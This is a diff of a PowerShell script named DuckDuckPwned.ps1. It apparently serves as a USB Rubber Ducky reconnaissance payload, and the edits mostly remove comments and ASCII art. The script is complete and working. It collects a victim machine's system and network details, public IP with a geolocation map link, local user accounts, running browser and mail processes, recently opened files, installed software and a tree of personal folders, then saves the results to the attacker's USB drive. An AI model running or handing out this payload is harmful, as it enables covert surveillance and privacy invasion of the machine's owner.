@@ -1,9 +1,9 @@
 param([string]$DuckyDrive)
 
 # ============================================================
-#   DuckDuckPwned.ps1
-#   Recon Combo: System Info + Geolocation + File Tree
-#   Output: saved directly to the ducky drive
+# DuckDuckPwned.ps1
+# Recon Combo: System Info + Geolocation + File Tree
+# Output: saved directly to the ducky drive
 # ============================================================
 
 $out = "$DuckyDrive\DuckDuckPwned.txt"
@@ -13,21 +13,13 @@ function Section($title) {
     "`n$line`n  $title`n$line" | Out-File $out -Append
 }
 
-# Header
 @"
 $line
-    ██████╗ ██╗   ██╗ ██████╗██╗  ██╗
-    ██╔══██╗██║   ██║██╔════╝██║ ██╔╝
-    ██║  ██║██║   ██║██║     █████╔╝ 
-    ██║  ██║██║   ██║██║     ██╔═██╗ 
-    ██████╔╝╚██████╔╝╚██████╗██║  ██╗
-    ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝
-         DuckDuckPwned — Recon Report
+    DuckDuckPwned - Recon Report
     Collected: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
 $line
 "@ | Out-File $out
 
-# ── SECTION 1: SYSTEM INFO ──────────────────────────────────
 Section "SYSTEM INFO"
 
 $os  = Get-WmiObject Win32_OperatingSystem
@@ -46,7 +38,6 @@ $uptime = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime)
   System Dir : $($os.SystemDirectory)
 "@ | Out-File $out -Append
 
-# ── SECTION 2: NETWORK INFO ─────────────────────────────────
 Section "NETWORK INFO"
 
 Get-NetIPAddress -AddressFamily IPv4 |
@@ -56,7 +47,6 @@ Get-NetIPAddress -AddressFamily IPv4 |
     Out-String |
     Out-File $out -Append
 
-# ── SECTION 3: GEOLOCATION (We Found You) ───────────────────
 Section "LOCATION + PUBLIC IP"
 
 try {
@@ -71,10 +61,9 @@ try {
   Maps Link  : https://maps.google.com/?q=$($geo.loc)
 "@ | Out-File $out -Append
 } catch {
-    "  [!] No internet access — geolocation skipped" | Out-File $out -Append
+    "  [!] No internet access - geolocation skipped" | Out-File $out -Append
 }
 
-# ── SECTION 4: LOCAL USERS ──────────────────────────────────
 Section "LOCAL USERS"
 
 Get-LocalUser |
@@ -83,7 +72,6 @@ Get-LocalUser |
     Out-String |
     Out-File $out -Append
 
-# ── SECTION 5: RUNNING PROCESSES (interesting ones) ─────────
 Section "NOTABLE RUNNING PROCESSES"
 
 $watchlist = @("chrome","firefox","edge","outlook","teams",
@@ -97,7 +85,6 @@ Get-Process |
     Out-String |
     Out-File $out -Append
 
-# ── SECTION 6: RECENTLY ACCESSED FILES ──────────────────────
 Section "RECENTLY ACCESSED FILES (Last 20)"
 
 Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
@@ -107,7 +94,6 @@ Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyConti
     Out-String |
     Out-File $out -Append
 
-# ── SECTION 7: INSTALLED SOFTWARE ───────────────────────────
 Section "INSTALLED SOFTWARE (Top 30)"
 
 Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" `
@@ -120,7 +106,6 @@ Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" `
     Out-String |
     Out-File $out -Append
 
-# ── SECTION 8: TREE OF KNOWLEDGE (File Map) ─────────────────
 Section "FILE SYSTEM TREE"
 
 foreach ($folder in @("Desktop", "Documents", "Downloads")) {
@@ -133,7 +118,6 @@ foreach ($folder in @("Desktop", "Documents", "Downloads")) {
     }
 }
 
-# ── FOOTER ──────────────────────────────────────────────────
 @"
 
 $line
@@ -141,5 +125,4 @@ $line
 $line
 "@ | Out-File $out -Append
 
-# Open the report on screen when done
 Start-Process notepad $out
